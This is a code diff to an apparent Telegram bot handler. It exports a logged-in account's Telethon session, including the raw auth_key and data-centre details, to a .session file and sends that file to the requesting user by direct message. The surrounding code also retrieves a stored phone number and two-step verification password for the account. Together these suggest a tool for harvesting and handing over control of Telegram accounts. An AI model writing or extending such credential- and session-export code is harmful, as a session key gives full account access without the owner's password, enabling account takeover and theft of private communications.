@@ -819,27 +819,34 @@ async def retrieve_options(client, callback_query):
 
             await tele_client.connect()
             me = await tele_client.get_me()
-            session_path = f"{me.id}.session"
-            tele_client.session.save()  # ensures .session file is created
+            session_name = f"{me.id}.session"
+            sqlite_session = SQLiteSession(session_name)
 
-            # Double-check path; for some session implementations, explicit save is needed
-            if not os.path.exists(session_path):
-                tele_client.session.save()  # ensure file exists
+            # Export current session details into SQLite session
+            sqlite_session.set_dc(tele_client.session.dc_id,
+                                  tele_client.session.server_address,
+                                  tele_client.session.port)
+            sqlite_session.auth_key = tele_client.session.auth_key
+            sqlite_session.save()
 
-            # Send the file
+            # Disconnect to ensure session is flushed to disk
+            await tele_client.disconnect()
+            await asyncio.sleep(1)
+
+            # Confirm file exists
+            if not os.path.exists(session_name):
+                return await callback_query.message.edit("❌ Failed to generate .session file.")
+
+            # Send as document
             await client.send_document(
                 chat_id=callback_query.from_user.id,
-                document=session_path,
+                document=session_name,
                 caption=f"🔑 **Telethon session file** for **{me.first_name}** (`{me.id}`)"
             )
-
             
-            try:
-                os.remove(session_path)
-            except:
-                pass
-
-            return await callback_query.message.edit("✅ Telethon `.session` file sent via DM.")
+            os.remove(session_name)
+            return await callback_query.message.edit("✅ `.session` file sent via DM.")
+            
         elif action == "phone":
             phone = doc.get("phone", "❌ Not saved")
             fa = doc.get("twofa", "❌ Not saved")
